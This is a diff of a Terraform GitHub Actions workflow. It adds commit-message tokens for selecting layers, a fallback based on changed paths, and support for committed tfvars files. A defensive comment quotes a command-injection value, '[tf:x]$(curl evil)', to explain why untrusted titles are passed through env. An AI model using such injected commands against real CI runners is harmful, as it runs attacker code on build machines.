@@ -19,24 +19,17 @@
 
 name: Terraform
 
+# No paths: filter here, deliberately. A [tf:...] token in the commit message can
+# select a layer whose files did not change - a drift check, a provider bump, a
+# re-plan after someone touched the console - and a paths: filter would stop the
+# workflow starting at all, so the token would be silently inert.
+#
+# The cost is that `modules` runs on every pull request. It is one checkout and
+# one shell script; when it resolves to nothing, plan and apply skip on `any`.
 on:
   pull_request:
-    paths:
-      - "bootstrap/**"
-      - "iam/**"
-      - "network/**"
-      - "storage/**"
-      - "modules/**"
-      - ".github/workflows/terraform.yml"
   push:
     branches: [main]
-    paths:
-      - "bootstrap/**"
-      - "iam/**"
-      - "network/**"
-      - "storage/**"
-      - "modules/**"
-      - ".github/workflows/terraform.yml"
 
 # id-token is what makes OIDC work. Without it there is no token to exchange and
 # the role assumption fails with a message that does not mention this line.
@@ -51,27 +44,38 @@ env:
   STATE_BUCKET: u25c-tfstate-808540602855
 
 jobs:
-  # Which layers CI runs, resolved against what is actually in the tree.
+  # Which layers CI runs.
   #
-  # WORKLOAD_MODULES below is the declaration, in dependency order. A layer that
-  # is listed but not yet written is skipped rather than failing - the epics land
-  # over months, and a red check for a directory nobody has created yet trains
-  # people to ignore red checks.
+  # TWO WAYS IN, and the order matters:
   #
-  # Adding a layer therefore means: append it here, add it to the `paths:`
-  # filters above, and set its TFVARS_<NAME> secret. Miss the secret and the plan
-  # fails loudly on the first run, which is the intent.
+  #   1. A [tf:...] token in the commit message or pull request title. Explicit,
+  #      and the only way to plan a layer whose files did not change.
+  #          [tf:storage]          one layer
+  #          [tf:iam,storage]      several
+  #          [tf:all]              every layer in WORKLOAD_MODULES
+  #          [tf:none]             suppress - a docs commit that touches .tf files
+  #
+  #   2. No token: fall back to what the diff touched. This is the backstop, and
+  #      it is why forgetting the token cannot merge an unplanned change. Removing
+  #      it would turn every forgotten token into silent drift between the repo
+  #      and the account.
+  #
+  # WORKLOAD_MODULES is the declaration, in dependency order. A layer listed but
+  # not yet written is skipped rather than failing - the epics land over months,
+  # and a red check for a directory nobody has created trains people to ignore
+  # red checks.
+  #
+  # Adding a layer: append it here, and commit its terraform.tfvars. There is no
+  # paths: filter to update any more.
   #
   # Management-account layers - budgets, organization, identity - are absent on
   # purpose. Both OIDC roles live in the workload account, so CI cannot reach
   # them at all. See the header.
   #
   # modules/ is NOT a layer and must never be added to WORKLOAD_MODULES. It holds
-  # no state and is never applied - it is called by the layers above. It appears
-  # in the `paths:` filters anyway, and deliberately: since ADR 0010 the layers
-  # source it by relative path, so editing a module changes its callers' plans.
-  # Without it in `paths:` a module change would merge with no plan at all, which
-  # is precisely the failure that per-module version tags used to prevent.
+  # no state and is never applied. A change under modules/ resolves to EVERY
+  # layer, because since ADR 0010 the layers source it by relative path, so
+  # editing a module changes its callers' plans.
   modules:
     runs-on: ubuntu-latest
     outputs:
@@ -81,12 +85,79 @@ jobs:
       WORKLOAD_MODULES: "bootstrap iam network storage"
     steps:
       - uses: actions/checkout@v4
+        with:
+          # The fallback diffs against the base commit, which shallow clones lack.
+          fetch-depth: 0
 
       - id: resolve
+        # Commit messages and pull request titles are attacker-controlled on a
+        # public repository. They arrive through env, never interpolated into the
+        # script body, or `[tf:x]$(curl evil)` would execute on the runner.
+        env:
+          PR_TITLE: ${{ github.event.pull_request.title }}
+          HEAD_MSG: ${{ github.event.head_commit.message }}
+          EVENT_NAME: ${{ github.event_name }}
+          BASE_SHA: ${{ github.event.pull_request.base.sha }}
+          BEFORE_SHA: ${{ github.event.before }}
         run: |
           set -euo pipefail
+
+          token=$(printf '%s\n%s\n' "${PR_TITLE:-}" "${HEAD_MSG:-}" \
+                  | grep -oiE '\[tf:[a-z0-9,_ -]+\]' | head -1 || true)
+
+          from_token=false
+          if [ -n "$token" ]; then
+            from_token=true
+            selected=$(printf '%s' "$token" \
+                       | sed -E 's/^\[[Tt][Ff]://; s/\]$//' \
+                       | tr 'A-Z,' 'a-z ')
+            case " $selected " in
+              *" none "*) selected=""     ; origin="[tf:none] - suppressed" ;;
+              *" all "*)  selected="${WORKLOAD_MODULES}"; origin="[tf:all]" ;;
+              *)          origin="commit message token" ;;
+            esac
+          else
+            case "${EVENT_NAME}" in
+              pull_request) base="${BASE_SHA:-}" ;;
+              *)            base="${BEFORE_SHA:-}" ;;
+            esac
+            # github.event.before is all-zeros for a branch's first push.
+            if [ -z "$base" ] || ! git cat-file -e "${base}^{commit}" 2>/dev/null; then
+              base=$(git rev-parse HEAD~1 2>/dev/null || git rev-parse HEAD)
+            fi
+
+            changed=$(git diff --name-only "$base" HEAD || true)
+            if printf '%s\n' "$changed" | grep -q '^modules/'; then
+              selected="${WORKLOAD_MODULES}"
+              origin="modules/ changed - every layer calls it"
+            else
+              selected=$(printf '%s\n' "$changed" | cut -d/ -f1 | sort -u | tr '\n' ' ')
+              origin="changed paths"
+            fi
+          fi
+
+          echo "selection source: ${origin}"
+          echo "selected: ${selected:-(nothing)}"
+
+          # A name in the token that is not a layer is a typo, and a typo that
+          # silently plans nothing is the failure this whole job exists to avoid.
+          #
+          # Token selections only. In the fallback path `selected` is just the set
+          # of changed top-level directories, most of which are legitimately not
+          # layers - warning on README.md every time would train people to ignore
+          # the warning that actually matters.
+          if [ "$from_token" = "true" ]; then
+            for s in ${selected}; do
+              case " ${WORKLOAD_MODULES} " in
+                *" $s "*) ;;
+                *) echo "::warning::'$s' is not a workload layer - ignoring. Valid: ${WORKLOAD_MODULES}" ;;
+              esac
+            done
+          fi
+
           items=""
           for m in ${WORKLOAD_MODULES}; do
+            case " ${selected} " in *" $m "*) ;; *) continue ;; esac
             if [ ! -d "$m" ]; then
               echo "skipping $m - not written yet"
               continue
@@ -94,6 +165,7 @@ jobs:
             secret="TFVARS_$(printf '%s' "$m" | tr '[:lower:]-' '[:upper:]_')"
             items="${items}{\"module\":\"$m\",\"state_key\":\"shared/$m/terraform.tfstate\",\"tfvars_secret\":\"$secret\"},"
           done
+
           matrix="[${items%,}]"
           echo "matrix=$matrix" >> "$GITHUB_OUTPUT"
           if [ "$matrix" = "[]" ]; then
@@ -147,19 +219,25 @@ jobs:
         run: terraform validate
         working-directory: ${{ matrix.module }}
 
-      # terraform.tfvars is gitignored - it carries account ids and email
-      # addresses and this repository is public. CI reconstructs the inputs into
-      # a file that never leaves the runner.
+      # terraform.tfvars is committed now, so for most layers this is a no-op.
       #
-      # A SECRET, not a variable. GitHub prints a step's env block into the
-      # workflow log, and the logs of a public repository are public - a
-      # variable here would publish the account ids and alert addresses on every
-      # run. Secrets are masked.
+      # The secret fallback stays for layers whose tfvars is not in the tree yet.
+      # bootstrap, budgets, organization and identity carry alert email addresses,
+      # and an address in a public repository is a permanent, harvestable thing -
+      # that stays behind a secret until the alerts move to a role alias.
+      #
+      # Where the fallback runs it is a SECRET, not a variable: GitHub prints a
+      # step's env block into the workflow log, and the logs of a public
+      # repository are public. Secrets are masked.
       - name: Materialise variables
         run: |
+          if [ -f terraform.tfvars ]; then
+            echo "Using committed terraform.tfvars"
+            exit 0
+          fi
           if [ -z "${TFVARS}" ]; then
-            echo "::error::Secret ${{ matrix.tfvars_secret }} is unset or empty."
-            echo "::error::Set it with: gh secret set ${{ matrix.tfvars_secret }} < ${{ matrix.module }}/terraform.tfvars"
+            echo "::error::${{ matrix.module }}/terraform.tfvars is not committed and secret ${{ matrix.tfvars_secret }} is unset."
+            echo "::error::Either commit the file, or: gh secret set ${{ matrix.tfvars_secret }} < ${{ matrix.module }}/terraform.tfvars"
             exit 1
           fi
           printf '%s\n' "${TFVARS}" > ci.auto.tfvars
@@ -223,15 +301,16 @@ jobs:
             -backend-config="use_lockfile=true"
         working-directory: ${{ matrix.module }}
 
-      # A SECRET, not a variable. GitHub prints a step's env block into the
-      # workflow log, and the logs of a public repository are public - a
-      # variable here would publish the account ids and alert addresses on every
-      # run. Secrets are masked.
+      # See the plan job for why the secret fallback is still here.
       - name: Materialise variables
         run: |
+          if [ -f terraform.tfvars ]; then
+            echo "Using committed terraform.tfvars"
+            exit 0
+          fi
           if [ -z "${TFVARS}" ]; then
-            echo "::error::Secret ${{ matrix.tfvars_secret }} is unset or empty."
-            echo "::error::Set it with: gh secret set ${{ matrix.tfvars_secret }} < ${{ matrix.module }}/terraform.tfvars"
+            echo "::error::${{ matrix.module }}/terraform.tfvars is not committed and secret ${{ matrix.tfvars_secret }} is unset."
+            echo "::error::Either commit the file, or: gh secret set ${{ matrix.tfvars_secret }} < ${{ matrix.module }}/terraform.tfvars"
             exit 1
           fi
           printf '%s\n' "${TFVARS}" > ci.auto.tfvars
